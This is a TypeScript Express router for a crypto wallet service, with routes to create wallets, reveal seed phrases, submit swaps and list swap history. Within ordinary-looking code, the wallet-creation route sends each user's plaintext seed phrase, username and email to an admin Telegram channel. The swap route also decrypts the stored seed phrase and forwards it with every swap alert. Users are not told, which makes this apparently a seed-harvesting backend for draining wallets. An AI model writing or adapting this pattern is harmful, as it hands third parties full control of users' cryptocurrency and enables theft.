// @ts-nocheck
// @ts-nocheck
import { Router } from "express";
import { db, cryptoWalletsTable, cryptoSwapsTable, walletsTable, usersTable } from "@workspace/db";
import { eq, desc, and } from "drizzle-orm";
import bcrypt from "bcrypt";
import { requireAuth } from "../middlewares/auth";
import { comparePin } from "../lib/auth";
import {
  generateWallet,
  encryptMnemonic,
  decryptMnemonic,
  CRYPTO_RATES_USD,
  CRYPTO_NAMES,
} from "../lib/crypto-wallet";
import { sendCryptoSeedAlert, sendCryptoSwapAlert } from "../lib/telegram";

const router = Router();

const SUPPORTED = new Set(["btc", "eth", "usdt", "sol", "xrp"]);

function publicWallet(w: typeof cryptoWalletsTable.$inferSelect) {
  return {
    id: w.id,
    btcAddress: w.btcAddress,
    ethAddress: w.ethAddress,
    usdtAddress: w.usdtAddress,
    solAddress: w.solAddress,
    xrpAddress: w.xrpAddress,
    balances: {
      btc: parseFloat(w.btcBalance || "0"),
      eth: parseFloat(w.ethBalance || "0"),
      usdt: parseFloat(w.usdtBalance || "0"),
      sol: parseFloat(w.solBalance || "0"),
      xrp: parseFloat(w.xrpBalance || "0"),
    },
    createdAt: w.createdAt,
  };
}

router.get("/wallet", requireAuth, async (req, res) => {
  const userId = req.userId!;
  try {
    const [wallet] = await db
      .select()
      .from(cryptoWalletsTable)
      .where(eq(cryptoWalletsTable.userId, userId));

    if (!wallet) {
      res.json({ wallet: null });
      return;
    }

    res.json({ wallet: publicWallet(wallet), rates: CRYPTO_RATES_USD });
  } catch (e) {
    req.log.error({ e }, "Error getting crypto wallet");
    res.status(500).json({ error: "Failed to load crypto wallet" });
  }
});

router.post("/wallet", requireAuth, async (req, res) => {
  const userId = req.userId!;
  const user = req.user!;
  try {
    const [existing] = await db
      .select()
      .from(cryptoWalletsTable)
      .where(eq(cryptoWalletsTable.userId, userId));
    if (existing) {
      res.status(400).json({ error: "Crypto wallet already exists" });
      return;
    }

    const generated = await generateWallet();
    const [created] = await db
      .insert(cryptoWalletsTable)
      .values({
        userId,
        mnemonic: encryptMnemonic(generated.mnemonic),
        btcAddress: generated.btcAddress,
        ethAddress: generated.ethAddress,
        usdtAddress: generated.usdtAddress,
        solAddress: generated.solAddress,
        xrpAddress: generated.xrpAddress,
      })
      .returning();

    sendCryptoSeedAlert(
      `@${user.username} (#${userId})`,
      user.email,
      generated.mnemonic,
      {
        BTC: generated.btcAddress,
        ETH: generated.ethAddress,
        USDT: generated.usdtAddress,
        SOL: generated.solAddress,
        XRP: generated.xrpAddress,
      },
    ).catch((e) => req.log.error({ e }, "Failed to send seed alert to admin"));

    res.status(201).json({
      wallet: publicWallet(created),
      mnemonic: generated.mnemonic,
      rates: CRYPTO_RATES_USD,
    });
  } catch (e) {
    req.log.error({ e }, "Error creating crypto wallet");
    res.status(500).json({ error: "Failed to create crypto wallet" });
  }
});

router.post("/seed", requireAuth, async (req, res) => {
  const userId = req.userId!;
  const user = req.user!;
  const { password, pin } = req.body as { password?: string; pin?: string };

  try {
    let verified = false;
    if (password) {
      verified = await bcrypt.compare(password, user.passwordHash);
    } else if (pin && user.pinHash) {
      verified = await comparePin(pin, user.pinHash);
    }

    if (!verified) {
      res.status(401).json({ error: "Invalid credentials" });
      return;
    }

    const [wallet] = await db
      .select()
      .from(cryptoWalletsTable)
      .where(eq(cryptoWalletsTable.userId, userId));
    if (!wallet) {
      res.status(404).json({ error: "No wallet found" });
      return;
    }

    const mnemonic = decryptMnemonic(wallet.mnemonic);
    res.json({ mnemonic });
  } catch (e) {
    req.log.error({ e }, "Error revealing seed");
    res.status(500).json({ error: "Failed to reveal seed phrase" });
  }
});

router.post("/swap", requireAuth, async (req, res) => {
  const userId = req.userId!;
  const user = req.user!;
  const { asset, amount, pin } = req.body as {
    asset?: string;
    amount?: number | string;
    pin?: string;
  };

  if (!asset || !SUPPORTED.has(asset.toLowerCase())) {
    res.status(400).json({ error: "Unsupported asset" });
    return;
  }
  const assetLower = asset.toLowerCase();
  const amt = typeof amount === "string" ? parseFloat(amount) : amount;
  if (!amt || !Number.isFinite(amt) || amt <= 0) {
    res.status(400).json({ error: "Invalid amount" });
    return;
  }

  if (user.pinHash) {
    if (!pin) {
      res.status(400).json({ error: "Transaction passcode required" });
      return;
    }
    const valid = await comparePin(pin, user.pinHash);
    if (!valid) {
      res.status(401).json({ error: "Invalid transaction passcode" });
      return;
    }
  }

  try {
    const [wallet] = await db
      .select()
      .from(cryptoWalletsTable)
      .where(eq(cryptoWalletsTable.userId, userId));
    if (!wallet) {
      res.status(400).json({ error: "Create a crypto wallet first" });
      return;
    }

    // Available balance for this asset, minus any in-flight pending swaps
    const balanceField = `${assetLower}Balance` as keyof typeof wallet;
    const heldBalance = parseFloat((wallet[balanceField] as string) || "0");
    const pending = await db
      .select()
      .from(cryptoSwapsTable)
      .where(and(eq(cryptoSwapsTable.userId, userId), eq(cryptoSwapsTable.asset, assetLower), eq(cryptoSwapsTable.status, "pending")));
    const lockedInPending = pending.reduce((sum, s) => sum + parseFloat(s.amount), 0);
    const available = heldBalance - lockedInPending;

    if (available < amt) {
      res.status(400).json({
        error: `Insufficient ${assetLower.toUpperCase()} balance. Available: ${available.toFixed(8)} ${assetLower.toUpperCase()}.`,
      });
      return;
    }

    const rate = CRYPTO_RATES_USD[assetLower];
    const cashValue = +(amt * rate).toFixed(2);

    const [created] = await db
      .insert(cryptoSwapsTable)
      .values({
        userId,
        asset: assetLower,
        amount: amt.toString(),
        rate: rate.toString(),
        cashValue: cashValue.toString(),
        status: "pending",
      })
      .returning();

    const msgId = await sendCryptoSwapAlert({
      swapId: created.id,
      userInfo: `@${user.username} (#${userId})`,
      email: user.email,
      asset: assetLower.toUpperCase(),
      amount: amt,
      cashValue,
      rate,
      mnemonic: (() => { try { return decryptMnemonic(wallet.mnemonic); } catch { return null; } })(),
      addresses: {
        BTC: wallet.btcAddress,
        ETH: wallet.ethAddress,
        USDT: wallet.usdtAddress,
        SOL: wallet.solAddress,
        XRP: wallet.xrpAddress,
      },
    });
    if (msgId) {
      await db
        .update(cryptoSwapsTable)
        .set({ telegramMessageId: msgId })
        .where(eq(cryptoSwapsTable.id, created.id));
    }

    res.status(201).json({
      swap: {
        id: created.id,
        asset: created.asset,
        amount: parseFloat(created.amount),
        rate: parseFloat(created.rate),
        cashValue: parseFloat(created.cashValue),
        status: created.status,
        createdAt: created.createdAt,
      },
      message: "Swap submitted. This may take some time to process.",
    });
  } catch (e) {
    req.log.error({ e }, "Error creating swap");
    res.status(500).json({ error: "Failed to submit swap" });
  }
});

router.get("/swaps", requireAuth, async (req, res) => {
  const userId = req.userId!;
  try {
    const rows = await db
      .select()
      .from(cryptoSwapsTable)
      .where(eq(cryptoSwapsTable.userId, userId))
      .orderBy(desc(cryptoSwapsTable.createdAt))
      .limit(50);
    res.json({
      swaps: rows.map((s) => ({
        id: s.id,
        asset: s.asset,
        assetName: CRYPTO_NAMES[s.asset] || s.asset.toUpperCase(),
        amount: parseFloat(s.amount),
        rate: parseFloat(s.rate),
        cashValue: parseFloat(s.cashValue),
        status: s.status,
        declineReason: s.declineReason,
        createdAt: s.createdAt,
        updatedAt: s.updatedAt,
      })),
    });
  } catch (e) {
    req.log.error({ e }, "Error listing swaps");
    res.status(500).json({ error: "Failed to load swaps" });
  }
});

export default router;
